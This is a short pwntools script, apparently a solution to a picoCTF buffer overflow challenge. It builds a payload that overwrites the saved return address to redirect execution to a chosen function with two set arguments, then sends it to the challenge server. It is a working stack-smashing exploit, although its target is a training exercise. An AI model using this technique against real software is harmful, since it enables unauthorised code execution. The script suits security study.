from pwn import *
port = int(input('port='))
r = process('/tmp/vuln3')
r = remote('saturn.picoctf.net', port)
payload = b'a' * 0x6c # Fill up the buffer and the pointer variable
payload += b'a' * 4 # Fill up EBP
payload += p32(0x08049296) # Return Address
# Padding for when the return address gets popped off the stack into EIP
payload += b'a' * 4
payload += p32(0xCAFEF00D) # argument 1
payload += p32(0xF00DF00D) # Argument 2

r.sendline(payload)
r.interactive()


